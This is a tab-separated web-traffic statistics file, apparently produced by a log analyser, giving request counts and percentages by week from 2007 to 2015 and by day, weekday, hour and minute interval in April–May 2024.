W	Rr	1373	0.071	2015	02	15
W	Rr	1790	0.093	2015	02	08
W	Rr	1672	0.086	2015	02	01
W	Rr	1543	0.080	2015	01	25
W	Rr	1463	0.076	2015	01	18
W	Rr	1696	0.088	2015	01	11
W	Rr	1707	0.088	2015	01	04
W	Rr	1833	0.095	2014	12	28
W	Rr	1335	0.069	2014	12	21
W	Rr	1644	0.085	2014	12	14
W	Rr	1541	0.080	2014	12	07
W	Rr	1335	0.069	2014	11	30
W	Rr	1262	0.065	2014	11	23
W	Rr	2009	0.104	2014	11	16
W	Rr	1566	0.081	2014	11	09
W	Rr	1814	0.094	2014	11	02
W	Rr	1452	0.075	2014	10	26
W	Rr	1642	0.085	2014	10	19
W	Rr	1795	0.093	2014	10	12
W	Rr	1836	0.095	2014	10	05
W	Rr	1662	0.086	2014	09	28
W	Rr	1843	0.095	2014	09	21
W	Rr	1678	0.087	2014	09	14
W	Rr	1598	0.083	2014	09	07
W	Rr	1418	0.073	2014	08	31
W	Rr	1584	0.082	2014	08	24
W	Rr	1571	0.081	2014	08	17
W	Rr	1727	0.089	2014	08	10
W	Rr	1927	0.100	2014	08	03
W	Rr	1691	0.087	2014	07	27
W	Rr	1702	0.088	2014	07	20
W	Rr	1624	0.084	2014	07	13
W	Rr	1831	0.095	2014	07	06
W	Rr	1867	0.097	2014	06	29
W	Rr	1927	0.100	2014	06	22
W	Rr	2134	0.110	2014	06	15
W	Rr	4851	0.251	2014	06	08
W	Rr	2293	0.119	2014	06	01
W	Rr	3180	0.164	2014	05	25
W	Rr	1468	0.076	2014	05	18
W	Rr	1808	0.094	2014	05	11
W	Rr	1998	0.103	2014	05	04
W	Rr	1876	0.097	2014	04	27
W	Rr	2330	0.121	2014	04	20
W	Rr	2565	0.133	2014	04	13
W	Rr	2652	0.137	2014	04	06
W	Rr	2574	0.133	2014	03	30
W	Rr	1186	0.061	2014	03	23
W	Rr	1305	0.067	2014	03	16
W	Rr	2273	0.118	2014	03	09
W	Rr	2231	0.115	2014	03	02
W	Rr	1925	0.100	2014	02	23
W	Rr	7060	0.365	2014	02	16
W	Rr	2854	0.148	2014	02	09
W	Rr	3190	0.165	2014	02	02
W	Rr	3743	0.194	2014	01	26
W	Rr	3643	0.188	2014	01	19
W	Rr	2961	0.153	2014	01	12
W	Rr	2319	0.120	2014	01	05
W	Rr	981	0.051	2013	12	29
W	Rr	1108	0.057	2013	12	22
W	Rr	1226	0.063	2013	12	15
W	Rr	1285	0.066	2013	12	08
W	Rr	1289	0.067	2013	12	01
W	Rr	1404	0.073	2013	11	24
W	Rr	1142	0.059	2013	11	17
W	Rr	1334	0.069	2013	11	10
W	Rr	1277	0.066	2013	11	03
W	Rr	1035	0.054	2013	10	27
W	Rr	1309	0.068	2013	10	20
W	Rr	1302	0.067	2013	10	13
W	Rr	1432	0.074	2013	10	06
W	Rr	1178	0.061	2013	09	29
W	Rr	947	0.049	2013	09	22
W	Rr	1254	0.065	2013	09	15
W	Rr	1099	0.057	2013	09	08
W	Rr	1053	0.054	2013	09	01
W	Rr	1010	0.052	2013	08	25
W	Rr	1102	0.057	2013	08	18
W	Rr	1063	0.055	2013	08	11
W	Rr	1105	0.057	2013	08	04
W	Rr	1377	0.071	2013	07	28
W	Rr	1498	0.077	2013	07	21
W	Rr	1295	0.067	2013	07	14
W	Rr	1237	0.064	2013	07	07
W	Rr	1003	0.052	2013	06	30
W	Rr	1275	0.066	2013	06	23
W	Rr	1072	0.055	2013	06	16
W	Rr	1249	0.065	2013	06	09
W	Rr	1521	0.079	2013	06	02
W	Rr	1256	0.065	2013	05	26
W	Rr	1091	0.056	2013	05	19
W	Rr	1359	0.070	2013	05	12
W	Rr	1130	0.058	2013	05	05
W	Rr	1215	0.063	2013	04	28
W	Rr	1368	0.071	2013	04	21
W	Rr	1318	0.068	2013	04	14
W	Rr	1408	0.073	2013	04	07
W	Rr	1277	0.066	2013	03	31
W	Rr	1452	0.075	2013	03	24
W	Rr	1418	0.073	2013	03	17
W	Rr	1217	0.063	2013	03	10
W	Rr	1490	0.077	2013	03	03
W	Rr	1353	0.070	2013	02	24
W	Rr	1268	0.066	2013	02	17
W	Rr	1274	0.066	2013	02	10
W	Rr	1153	0.060	2013	02	03
W	Rr	1266	0.065	2013	01	27
W	Rr	1271	0.066	2013	01	20
W	Rr	1449	0.075	2013	01	13
W	Rr	1253	0.065	2013	01	06
W	Rr	1309	0.068	2012	12	30
W	Rr	1156	0.060	2012	12	23
W	Rr	1336	0.069	2012	12	16
W	Rr	1575	0.081	2012	12	09
W	Rr	1087	0.056	2012	12	02
W	Rr	1376	0.071	2012	11	25
W	Rr	1136	0.059	2012	11	18
W	Rr	1341	0.069	2012	11	11
W	Rr	1418	0.073	2012	11	04
W	Rr	1103	0.057	2012	10	28
W	Rr	1200	0.062	2012	10	21
W	Rr	1382	0.071	2012	10	14
W	Rr	1127	0.058	2012	10	07
W	Rr	1187	0.061	2012	09	30
W	Rr	1172	0.061	2012	09	23
W	Rr	1034	0.053	2012	09	16
W	Rr	944	0.049	2012	09	09
W	Rr	958	0.050	2012	09	02
W	Rr	734	0.038	2012	08	26
W	Rr	881	0.046	2012	08	19
W	Rr	874	0.045	2012	08	12
W	Rr	973	0.050	2012	08	05
W	Rr	1010	0.052	2012	07	29
W	Rr	943	0.049	2012	07	22
W	Rr	1089	0.056	2012	07	15
W	Rr	888	0.046	2012	07	08
W	Rr	845	0.044	2012	07	01
W	Rr	1070	0.055	2012	06	24
W	Rr	1050	0.054	2012	06	17
W	Rr	1271	0.066	2012	06	10
W	Rr	957	0.049	2012	06	03
W	Rr	1249	0.065	2012	05	27
W	Rr	1055	0.055	2012	05	20
W	Rr	1392	0.072	2012	05	13
W	Rr	1140	0.059	2012	05	06
W	Rr	1807	0.093	2012	04	29
W	Rr	1225	0.063	2012	04	22
W	Rr	1264	0.065	2012	04	15
W	Rr	1075	0.056	2012	04	08
W	Rr	1261	0.065	2012	04	01
W	Rr	1345	0.070	2012	03	25
W	Rr	1254	0.065	2012	03	18
W	Rr	1478	0.076	2012	03	11
W	Rr	1503	0.078	2012	03	04
W	Rr	1532	0.079	2012	02	26
W	Rr	1464	0.076	2012	02	19
W	Rr	1154	0.060	2012	02	12
W	Rr	1240	0.064	2012	02	05
W	Rr	1088	0.056	2012	01	29
W	Rr	1125	0.058	2012	01	22
W	Rr	60	0.003	2012	01	15
W	Rr	1472	0.076	2012	01	08
W	Rr	1122	0.058	2012	01	01
W	Rr	888	0.046	2011	12	25
W	Rr	1360	0.070	2011	12	18
W	Rr	1486	0.077	2011	12	11
W	Rr	1330	0.069	2011	12	04
W	Rr	1094	0.057	2011	11	27
W	Rr	1062	0.055	2011	11	20
W	Rr	1123	0.058	2011	11	13
W	Rr	975	0.050	2011	11	06
W	Rr	1264	0.065	2011	10	30
W	Rr	1140	0.059	2011	10	23
W	Rr	1211	0.063	2011	10	16
W	Rr	1236	0.064	2011	10	09
W	Rr	1128	0.058	2011	10	02
W	Rr	1083	0.056	2011	09	25
W	Rr	1451	0.075	2011	09	18
W	Rr	1278	0.066	2011	09	11
W	Rr	1219	0.063	2011	09	04
W	Rr	1316	0.068	2011	08	28
W	Rr	1119	0.058	2011	08	21
W	Rr	1484	0.077	2011	08	14
W	Rr	1671	0.086	2011	08	07
W	Rr	1319	0.068	2011	07	31
W	Rr	1197	0.062	2011	07	24
W	Rr	1504	0.078	2011	07	17
W	Rr	1367	0.071	2011	07	10
W	Rr	1205	0.062	2011	07	03
W	Rr	1333	0.069	2011	06	26
W	Rr	1059	0.055	2011	06	19
W	Rr	1353	0.070	2011	06	12
W	Rr	1275	0.066	2011	06	05
W	Rr	983	0.051	2011	05	29
W	Rr	1262	0.065	2011	05	22
W	Rr	1374	0.071	2011	05	15
W	Rr	1076	0.056	2011	05	08
W	Rr	0	0.000	2011	05	01
W	Rr	0	0.000	2011	04	24
W	Rr	0	0.000	2011	04	17
W	Rr	0	0.000	2011	04	10
W	Rr	0	0.000	2011	04	03
W	Rr	0	0.000	2011	03	27
W	Rr	24	0.001	2011	03	20
W	Rr	1317	0.068	2011	03	13
W	Rr	1258	0.065	2011	03	06
W	Rr	1372	0.071	2011	02	27
W	Rr	1226	0.063	2011	02	20
W	Rr	1524	0.079	2011	02	13
W	Rr	1366	0.071	2011	02	06
W	Rr	958	0.050	2011	01	30
W	Rr	1273	0.066	2011	01	23
W	Rr	1560	0.081	2011	01	16
W	Rr	1472	0.076	2011	01	09
W	Rr	1310	0.068	2011	01	02
W	Rr	798	0.041	2010	12	26
W	Rr	935	0.048	2010	12	19
W	Rr	0	0.000	2010	12	12
W	Rr	0	0.000	2010	12	05
W	Rr	0	0.000	2010	11	28
W	Rr	0	0.000	2010	11	21
W	Rr	0	0.000	2010	11	14
W	Rr	0	0.000	2010	11	07
W	Rr	0	0.000	2010	10	31
W	Rr	0	0.000	2010	10	24
W	Rr	0	0.000	2010	10	17
W	Rr	0	0.000	2010	10	10
W	Rr	0	0.000	2010	10	03
W	Rr	0	0.000	2010	09	26
W	Rr	0	0.000	2010	09	19
W	Rr	0	0.000	2010	09	12
W	Rr	0	0.000	2010	09	05
W	Rr	0	0.000	2010	08	29
W	Rr	0	0.000	2010	08	22
W	Rr	0	0.000	2010	08	15
W	Rr	0	0.000	2010	08	08
W	Rr	0	0.000	2010	08	01
W	Rr	0	0.000	2010	07	25
W	Rr	0	0.000	2010	07	18
W	Rr	0	0.000	2010	07	11
W	Rr	0	0.000	2010	07	04
W	Rr	15	0.001	2010	06	27
W	Rr	914	0.047	2010	06	20
W	Rr	1104	0.057	2010	06	13
W	Rr	1096	0.057	2010	06	06
W	Rr	1171	0.061	2010	05	30
W	Rr	1115	0.058	2010	05	23
W	Rr	1170	0.061	2010	05	16
W	Rr	1334	0.069	2010	05	09
W	Rr	1109	0.057	2010	05	02
W	Rr	1067	0.055	2010	04	25
W	Rr	1212	0.063	2010	04	18
W	Rr	1054	0.055	2010	04	11
W	Rr	1325	0.069	2010	04	04
W	Rr	811	0.042	2010	03	28
W	Rr	1195	0.062	2010	03	21
W	Rr	1338	0.069	2010	03	14
W	Rr	1113	0.058	2010	03	07
W	Rr	1103	0.057	2010	02	28
W	Rr	1290	0.067	2010	02	21
W	Rr	0	0.000	2010	02	14
W	Rr	0	0.000	2010	02	07
W	Rr	0	0.000	2010	01	31
W	Rr	0	0.000	2010	01	24
W	Rr	0	0.000	2010	01	17
W	Rr	0	0.000	2010	01	10
W	Rr	0	0.000	2010	01	03
W	Rr	78	0.004	2009	12	27
W	Rr	945	0.049	2009	12	20
W	Rr	1140	0.059	2009	12	13
W	Rr	1323	0.068	2009	12	06
W	Rr	1518	0.079	2009	11	29
W	Rr	1352	0.070	2009	11	22
W	Rr	1346	0.070	2009	11	15
W	Rr	1416	0.073	2009	11	08
W	Rr	1734	0.090	2009	11	01
W	Rr	1035	0.054	2009	10	25
W	Rr	1297	0.067	2009	10	18
W	Rr	1267	0.066	2009	10	11
W	Rr	1440	0.074	2009	10	04
W	Rr	1521	0.079	2009	09	27
W	Rr	1121	0.058	2009	09	20
W	Rr	875	0.045	2009	09	13
W	Rr	1032	0.053	2009	09	06
W	Rr	1283	0.066	2009	08	30
W	Rr	1214	0.063	2009	08	23
W	Rr	1402	0.073	2009	08	16
W	Rr	1260	0.065	2009	08	09
W	Rr	1404	0.073	2009	08	02
W	Rr	1380	0.071	2009	07	26
W	Rr	1470	0.076	2009	07	19
W	Rr	1750	0.091	2009	07	12
W	Rr	1847	0.096	2009	07	05
W	Rr	1889	0.098	2009	06	28
W	Rr	1312	0.068	2009	06	21
W	Rr	1093	0.057	2009	06	14
W	Rr	1363	0.070	2009	06	07
W	Rr	1251	0.065	2009	05	31
W	Rr	1352	0.070	2009	05	24
W	Rr	1133	0.059	2009	05	17
W	Rr	1887	0.098	2009	05	10
W	Rr	1369	0.071	2009	05	03
W	Rr	1089	0.056	2009	04	26
W	Rr	1160	0.060	2009	04	19
W	Rr	1189	0.061	2009	04	12
W	Rr	1529	0.079	2009	04	05
W	Rr	1155	0.060	2009	03	29
W	Rr	1230	0.064	2009	03	22
W	Rr	1029	0.053	2009	03	15
W	Rr	1234	0.064	2009	03	08
W	Rr	1486	0.077	2009	03	01
W	Rr	1470	0.076	2009	02	22
W	Rr	1198	0.062	2009	02	15
W	Rr	1802	0.093	2009	02	08
W	Rr	1653	0.085	2009	02	01
W	Rr	1346	0.070	2009	01	25
W	Rr	1431	0.074	2009	01	18
W	Rr	1678	0.087	2009	01	11
W	Rr	1591	0.082	2009	01	04
W	Rr	886	0.046	2008	12	28
W	Rr	1148	0.059	2008	12	21
W	Rr	1428	0.074	2008	12	14
W	Rr	1508	0.078	2008	12	07
W	Rr	1194	0.062	2008	11	30
W	Rr	1070	0.055	2008	11	23
W	Rr	1396	0.072	2008	11	16
W	Rr	1255	0.065	2008	11	09
W	Rr	1314	0.068	2008	11	02
W	Rr	1397	0.072	2008	10	26
W	Rr	1638	0.085	2008	10	19
W	Rr	1298	0.067	2008	10	12
W	Rr	430	0.022	2008	10	05
W	Rr	723	0.037	2008	09	28
W	Rr	1308	0.068	2008	09	21
W	Rr	1242	0.064	2008	09	14
W	Rr	1409	0.073	2008	09	07
W	Rr	1142	0.059	2008	08	31
W	Rr	1022	0.053	2008	08	24
W	Rr	1062	0.055	2008	08	17
W	Rr	1188	0.061	2008	08	10
W	Rr	1232	0.064	2008	08	03
W	Rr	1050	0.054	2008	07	27
W	Rr	1272	0.066	2008	07	20
W	Rr	1305	0.067	2008	07	13
W	Rr	1093	0.057	2008	07	06
W	Rr	1182	0.061	2008	06	29
W	Rr	1937	0.100	2008	06	22
W	Rr	1493	0.077	2008	06	15
W	Rr	1083	0.056	2008	06	08
W	Rr	1283	0.066	2008	06	01
W	Rr	1432	0.074	2008	05	25
W	Rr	1726	0.089	2008	05	18
W	Rr	1580	0.082	2008	05	11
W	Rr	2661	0.138	2008	05	04
W	Rr	3648	0.189	2008	04	27
W	Rr	1400	0.072	2008	04	20
W	Rr	1365	0.071	2008	04	13
W	Rr	1213	0.063	2008	04	06
W	Rr	1670	0.086	2008	03	30
W	Rr	1211	0.063	2008	03	23
W	Rr	1144	0.059	2008	03	16
W	Rr	1301	0.067	2008	03	09
W	Rr	1292	0.067	2008	03	02
W	Rr	1427	0.074	2008	02	24
W	Rr	2207	0.114	2008	02	17
W	Rr	1124	0.058	2008	02	10
W	Rr	1561	0.081	2008	02	03
W	Rr	1533	0.079	2008	01	27
W	Rr	1389	0.072	2008	01	20
W	Rr	1133	0.059	2008	01	13
W	Rr	1404	0.073	2008	01	06
W	Rr	976	0.050	2007	12	30
W	Rr	801	0.041	2007	12	23
W	Rr	675	0.035	2007	12	16
W	*BT	R	26220	2024	01	28
D	Rr	189	0.010	2024	05	28
D	Rr	352	0.018	2024	05	27
D	Rr	609	0.031	2024	05	26
D	Rr	1262	0.065	2024	05	25
D	Rr	823	0.043	2024	05	24
D	Rr	1806	0.093	2024	05	23
D	Rr	2196	0.114	2024	05	22
D	Rr	2040	0.106	2024	05	21
D	Rr	3204	0.166	2024	05	20
D	Rr	1872	0.097	2024	05	19
D	Rr	2256	0.117	2024	05	18
D	Rr	2814	0.146	2024	05	17
D	Rr	1896	0.098	2024	05	16
D	Rr	1794	0.093	2024	05	15
D	Rr	2232	0.115	2024	05	14
D	Rr	2160	0.112	2024	05	13
D	Rr	1194	0.062	2024	05	12
D	Rr	2106	0.109	2024	05	11
D	Rr	2712	0.140	2024	05	10
D	Rr	2058	0.106	2024	05	09
D	Rr	2922	0.151	2024	05	08
D	Rr	2832	0.146	2024	05	07
D	Rr	3162	0.164	2024	05	06
D	Rr	1728	0.089	2024	05	05
D	Rr	1494	0.077	2024	05	04
D	Rr	3282	0.170	2024	05	03
D	Rr	3804	0.197	2024	05	02
D	Rr	2189	0.113	2024	05	01
D	Rr	2530	0.131	2024	04	30
D	Rr	3120	0.161	2024	04	29
D	Rr	1205	0.062	2024	04	28
D	Rr	875	0.045	2024	04	27
D	Rr	1520	0.079	2024	04	26
D	Rr	2536	0.131	2024	04	25
D	Rr	3144	0.163	2024	04	24
D	Rr	2538	0.131	2024	04	23
D	Rr	3678	0.190	2024	04	22
D	Rr	1314	0.068	2024	04	21
D	Rr	1560	0.081	2024	04	20
D	Rr	1086	0.056	2024	04	19
D	Rr	1776	0.092	2024	04	18
D	Rr	2172	0.112	2024	04	17
D	*BT	R	9912	2024	01	29
d	Rr	227437	11.764	Sun
d	Rr	317126	16.403	Mon
d	Rr	315241	16.306	Tue
d	Rr	314952	16.291	Wed
d	Rr	306700	15.864	Thu
d	Rr	283567	14.667	Fri
d	Rr	168316	8.706	Sat
H	Rr	4	0.000	2024	05	28	04
H	Rr	2	0.000	2024	05	28	03
H	Rr	167	0.009	2024	05	28	02
H	Rr	4	0.000	2024	05	28	01
H	Rr	12	0.001	2024	05	28	00
H	Rr	3	0.000	2024	05	27	23
H	Rr	11	0.001	2024	05	27	22
H	Rr	3	0.000	2024	05	27	21
H	Rr	0	0.000	2024	05	27	20
H	Rr	8	0.000	2024	05	27	19
H	Rr	3	0.000	2024	05	27	18
H	Rr	6	0.000	2024	05	27	17
H	Rr	5	0.000	2024	05	27	16
H	Rr	47	0.002	2024	05	27	15
H	Rr	38	0.002	2024	05	27	14
H	Rr	5	0.000	2024	05	27	13
H	Rr	8	0.000	2024	05	27	12
H	Rr	9	0.000	2024	05	27	11
H	Rr	1	0.000	2024	05	27	10
H	Rr	6	0.000	2024	05	27	09
H	Rr	5	0.000	2024	05	27	08
H	Rr	4	0.000	2024	05	27	07
H	Rr	11	0.001	2024	05	27	06
H	Rr	95	0.005	2024	05	27	05
H	Rr	2	0.000	2024	05	27	04
H	Rr	8	0.000	2024	05	27	03
H	Rr	2	0.000	2024	05	27	02
H	Rr	42	0.002	2024	05	27	01
H	Rr	30	0.002	2024	05	27	00
H	Rr	12	0.001	2024	05	26	23
H	Rr	8	0.000	2024	05	26	22
H	Rr	158	0.008	2024	05	26	21
H	Rr	112	0.006	2024	05	26	20
H	Rr	0	0.000	2024	05	26	19
H	Rr	14	0.001	2024	05	26	18
H	Rr	6	0.000	2024	05	26	17
H	Rr	8	0.000	2024	05	26	16
H	Rr	2	0.000	2024	05	26	15
H	Rr	8	0.000	2024	05	26	14
H	Rr	78	0.004	2024	05	26	13
H	Rr	12	0.001	2024	05	26	12
H	Rr	4	0.000	2024	05	26	11
H	Rr	8	0.000	2024	05	26	10
H	Rr	28	0.001	2024	05	26	09
H	Rr	6	0.000	2024	05	26	08
H	Rr	62	0.003	2024	05	26	07
H	Rr	16	0.001	2024	05	26	06
H	Rr	10	0.001	2024	05	26	05
H	Rr	3	0.000	2024	05	26	04
H	Rr	9	0.000	2024	05	26	03
H	Rr	12	0.001	2024	05	26	02
H	Rr	6	0.000	2024	05	26	01
H	Rr	27	0.001	2024	05	26	00
H	Rr	3	0.000	2024	05	25	23
H	Rr	18	0.001	2024	05	25	22
H	Rr	21	0.001	2024	05	25	21
H	Rr	24	0.001	2024	05	25	20
H	Rr	18	0.001	2024	05	25	19
H	Rr	117	0.006	2024	05	25	18
H	Rr	12	0.001	2024	05	25	17
H	Rr	105	0.005	2024	05	25	16
H	Rr	63	0.003	2024	05	25	15
H	Rr	159	0.008	2024	05	25	14
H	Rr	21	0.001	2024	05	25	13
H	Rr	36	0.002	2024	05	25	12
H	Rr	147	0.008	2024	05	25	11
H	Rr	87	0.004	2024	05	25	10
H	Rr	30	0.002	2024	05	25	09
H	Rr	21	0.001	2024	05	25	08
H	Rr	15	0.001	2024	05	25	07
H	Rr	15	0.001	2024	05	25	06
H	Rr	18	0.001	2024	05	25	05
H	*BT	R	1638	2024	01	29	20
h	Rr	75643	3.913	00
h	Rr	70385	3.641	01
h	Rr	72667	3.759	02
h	Rr	74307	3.843	03
h	Rr	72545	3.752	04
h	Rr	70957	3.670	05
h	Rr	66921	3.461	06
h	Rr	64841	3.354	07
h	Rr	62609	3.238	08
h	Rr	61612	3.187	09
h	Rr	64967	3.360	10
h	Rr	66672	3.449	11
h	Rr	66757	3.453	12
h	Rr	73709	3.813	13
h	Rr	90250	4.668	14
h	Rr	93758	4.850	15
h	Rr	105704	5.467	16
h	Rr	105685	5.466	17
h	Rr	107796	5.576	18
h	Rr	105452	5.454	19
h	Rr	100356	5.191	20
h	Rr	92805	4.800	21
h	Rr	86422	4.470	22
h	Rr	80519	4.165	23
4	Rr	3	0.000	2024	05	28	04	30
4	Rr	0	0.000	2024	05	28	04	15
4	Rr	1	0.000	2024	05	28	04	00
4	Rr	0	0.000	2024	05	28	03	45
4	Rr	2	0.000	2024	05	28	03	30
4	Rr	0	0.000	2024	05	28	03	15
4	Rr	0	0.000	2024	05	28	03	00
4	Rr	6	0.000	2024	05	28	02	45
4	Rr	0	0.000	2024	05	28	02	30
4	Rr	18	0.001	2024	05	28	02	15
4	Rr	143	0.007	2024	05	28	02	00
4	Rr	0	0.000	2024	05	28	01	45
4	Rr	1	0.000	2024	05	28	01	30
4	Rr	2	0.000	2024	05	28	01	15
4	Rr	1	0.000	2024	05	28	01	00
4	Rr	8	0.000	2024	05	28	00	45
4	Rr	1	0.000	2024	05	28	00	30
4	Rr	0	0.000	2024	05	28	00	15
4	Rr	3	0.000	2024	05	28	00	00
4	Rr	2	0.000	2024	05	27	23	45
4	Rr	0	0.000	2024	05	27	23	30
4	Rr	0	0.000	2024	05	27	23	15
4	Rr	1	0.000	2024	05	27	23	00
4	Rr	0	0.000	2024	05	27	22	45
4	Rr	8	0.000	2024	05	27	22	30
4	Rr	2	0.000	2024	05	27	22	15
4	Rr	1	0.000	2024	05	27	22	00
4	Rr	2	0.000	2024	05	27	21	45
4	Rr	0	0.000	2024	05	27	21	30
4	Rr	1	0.000	2024	05	27	21	15
4	Rr	0	0.000	2024	05	27	21	00
4	Rr	0	0.000	2024	05	27	20	45
4	Rr	0	0.000	2024	05	27	20	30
4	Rr	0	0.000	2024	05	27	20	15
4	Rr	0	0.000	2024	05	27	20	00
4	Rr	2	0.000	2024	05	27	19	45
4	Rr	2	0.000	2024	05	27	19	30
4	Rr	1	0.000	2024	05	27	19	15
4	Rr	3	0.000	2024	05	27	19	00
4	Rr	0	0.000	2024	05	27	18	45
4	Rr	1	0.000	2024	05	27	18	30
4	Rr	2	0.000	2024	05	27	18	15
4	Rr	0	0.000	2024	05	27	18	00
4	Rr	2	0.000	2024	05	27	17	45
4	Rr	0	0.000	2024	05	27	17	30
4	Rr	4	0.000	2024	05	27	17	15
4	Rr	0	0.000	2024	05	27	17	00
4	Rr	0	0.000	2024	05	27	16	45
4	Rr	0	0.000	2024	05	27	16	30
4	Rr	4	0.000	2024	05	27	16	15
4	Rr	1	0.000	2024	05	27	16	00
4	Rr	1	0.000	2024	05	27	15	45
4	Rr	38	0.002	2024	05	27	15	30
4	Rr	8	0.000	2024	05	27	15	15
4	Rr	0	0.000	2024	05	27	15	00
4	Rr	1	0.000	2024	05	27	14	45
4	Rr	0	0.000	2024	05	27	14	30
4	Rr	0	0.000	2024	05	27	14	15
4	Rr	37	0.002	2024	05	27	14	00
4	Rr	1	0.000	2024	05	27	13	45
4	Rr	2	0.000	2024	05	27	13	30
4	Rr	0	0.000	2024	05	27	13	15
4	Rr	2	0.000	2024	05	27	13	00
4	Rr	2	0.000	2024	05	27	12	45
4	Rr	0	0.000	2024	05	27	12	30
4	Rr	0	0.000	2024	05	27	12	15
4	Rr	6	0.000	2024	05	27	12	00
4	Rr	3	0.000	2024	05	27	11	45
4	Rr	6	0.000	2024	05	27	11	30
4	Rr	0	0.000	2024	05	27	11	15
4	Rr	0	0.000	2024	05	27	11	00
4	Rr	0	0.000	2024	05	27	10	45
4	Rr	1	0.000	2024	05	27	10	30
4	Rr	0	0.000	2024	05	27	10	15
4	Rr	0	0.000	2024	05	27	10	00
4	Rr	1	0.000	2024	05	27	09	45
4	Rr	3	0.000	2024	05	27	09	30
4	Rr	1	0.000	2024	05	27	09	15
4	Rr	1	0.000	2024	05	27	09	00
4	Rr	0	0.000	2024	05	27	08	45
4	Rr	4	0.000	2024	05	27	08	30
4	Rr	1	0.000	2024	05	27	08	15
4	Rr	0	0.000	2024	05	27	08	00
4	Rr	1	0.000	2024	05	27	07	45
4	Rr	0	0.000	2024	05	27	07	30
4	Rr	3	0.000	2024	05	27	07	15
4	Rr	0	0.000	2024	05	27	07	00
4	Rr	2	0.000	2024	05	27	06	45
4	Rr	5	0.000	2024	05	27	06	30
4	Rr	2	0.000	2024	05	27	06	15
4	Rr	2	0.000	2024	05	27	06	00
4	Rr	0	0.000	2024	05	27	05	45
4	Rr	42	0.002	2024	05	27	05	30
4	Rr	52	0.003	2024	05	27	05	15
4	Rr	1	0.000	2024	05	27	05	00
4	Rr	2	0.000	2024	05	27	04	45
4	*BT	R	1068	2024	05	06	16	00
6	Rr	20361	1.053	00	00
6	Rr	17623	0.912	00	15
6	Rr	19198	0.993	00	30
6	Rr	18461	0.955	00	45
6	Rr	16297	0.843	01	00
6	Rr	17986	0.930	01	15
6	Rr	17217	0.891	01	30
6	Rr	18885	0.977	01	45
6	Rr	15768	0.816	02	00
6	Rr	19431	1.005	02	15
6	Rr	19085	0.987	02	30
6	Rr	18383	0.951	02	45
6	Rr	17782	0.920	03	00
6	Rr	17660	0.913	03	15
6	Rr	18057	0.934	03	30
6	Rr	20808	1.076	03	45
6	Rr	17712	0.916	04	00
6	Rr	16563	0.857	04	15
6	Rr	18518	0.958	04	30
6	Rr	19752	1.022	04	45
6	Rr	16790	0.868	05	00
6	Rr	18822	0.974	05	15
6	Rr	17348	0.897	05	30
6	Rr	17997	0.931	05	45
6	Rr	17524	0.906	06	00
6	Rr	15854	0.820	06	15
6	Rr	18426	0.953	06	30
6	Rr	15117	0.782	06	45
6	Rr	16200	0.838	07	00
6	Rr	16704	0.864	07	15
6	Rr	16339	0.845	07	30
6	Rr	15598	0.807	07	45
6	Rr	15575	0.806	08	00
6	Rr	15548	0.804	08	15
6	Rr	16768	0.867	08	30
6	Rr	14718	0.761	08	45
6	Rr	14913	0.771	09	00
6	Rr	15657	0.810	09	15
6	Rr	16710	0.864	09	30
6	Rr	14332	0.741	09	45
6	Rr	14926	0.772	10	00
6	Rr	15457	0.799	10	15
6	Rr	18424	0.953	10	30
6	Rr	16160	0.836	10	45
6	Rr	17851	0.923	11	00
6	Rr	16895	0.874	11	15
6	Rr	16925	0.875	11	30
6	Rr	15001	0.776	11	45
6	Rr	17537	0.907	12	00
6	Rr	15806	0.818	12	15
6	Rr	16000	0.828	12	30
6	Rr	17414	0.901	12	45
6	Rr	17734	0.917	13	00
6	Rr	19399	1.003	13	15
6	Rr	19004	0.983	13	30
6	Rr	17572	0.909	13	45
6	Rr	21890	1.132	14	00
6	Rr	23984	1.241	14	15
6	Rr	22899	1.184	14	30
6	Rr	21477	1.111	14	45
6	Rr	22652	1.172	15	00
6	Rr	22260	1.151	15	15
6	Rr	24382	1.261	15	30
6	Rr	24464	1.265	15	45
6	Rr	27589	1.427	16	00
6	Rr	27143	1.404	16	15
6	Rr	25060	1.296	16	30
6	Rr	25912	1.340	16	45
6	Rr	28401	1.469	17	00
6	Rr	25731	1.331	17	15
6	Rr	26108	1.350	17	30
6	Rr	25445	1.316	17	45
6	Rr	28345	1.466	18	00
6	Rr	25354	1.311	18	15
6	Rr	27212	1.408	18	30
6	Rr	26885	1.391	18	45
6	Rr	27681	1.432	19	00
6	Rr	23875	1.235	19	15
6	Rr	25219	1.304	19	30
6	Rr	28677	1.483	19	45
6	Rr	25110	1.299	20	00
6	Rr	25931	1.341	20	15
6	Rr	24602	1.273	20	30
6	Rr	24713	1.278	20	45
6	Rr	23827	1.232	21	00
6	Rr	24351	1.260	21	15
6	Rr	21584	1.116	21	30
6	Rr	23043	1.192	21	45
6	Rr	20316	1.051	22	00
6	Rr	22585	1.168	22	15
6	Rr	21584	1.116	22	30
6	Rr	21937	1.135	22	45
6	Rr	21866	1.131	23	00
6	Rr	22942	1.187	23	15
6	Rr	17274	0.893	23	30
6	Rr	18437	0.954	23	45
5	Rr	3	0.000	2024	05	28	04	35
5	Rr	0	0.000	2024	05	28	04	30
5	Rr	0	0.000	2024	05	28	04	25
5	Rr	0	0.000	2024	05	28	04	20
5	Rr	0	0.000	2024	05	28	04	15
5	Rr	0	0.000	2024	05	28	04	10
5	Rr	1	0.000	2024	05	28	04	05
5	Rr	0	0.000	2024	05	28	04	00
5	Rr	0	0.000	2024	05	28	03	55
5	Rr	0	0.000	2024	05	28	03	50
5	Rr	0	0.000	2024	05	28	03	45
5	Rr	2	0.000	2024	05	28	03	40
5	Rr	0	0.000	2024	05	28	03	35
5	Rr	0	0.000	2024	05	28	03	30
5	Rr	0	0.000	2024	05	28	03	25
5	Rr	0	0.000	2024	05	28	03	20
5	Rr	0	0.000	2024	05	28	03	15
5	Rr	0	0.000	2024	05	28	03	10
5	Rr	0	0.000	2024	05	28	03	05
5	Rr	0	0.000	2024	05	28	03	00
5	Rr	2	0.000	2024	05	28	02	55
5	Rr	4	0.000	2024	05	28	02	50
5	Rr	0	0.000	2024	05	28	02	45
5	Rr	0	0.000	2024	05	28	02	40
5	Rr	0	0.000	2024	05	28	02	35
5	Rr	0	0.000	2024	05	28	02	30
5	Rr	0	0.000	2024	05	28	02	25
5	Rr	18	0.001	2024	05	28	02	20
5	Rr	0	0.000	2024	05	28	02	15
5	Rr	31	0.002	2024	05	28	02	10
5	Rr	112	0.006	2024	05	28	02	05
5	Rr	0	0.000	2024	05	28	02	00
5	Rr	0	0.000	2024	05	28	01	55
5	Rr	0	0.000	2024	05	28	01	50
5	Rr	0	0.000	2024	05	28	01	45
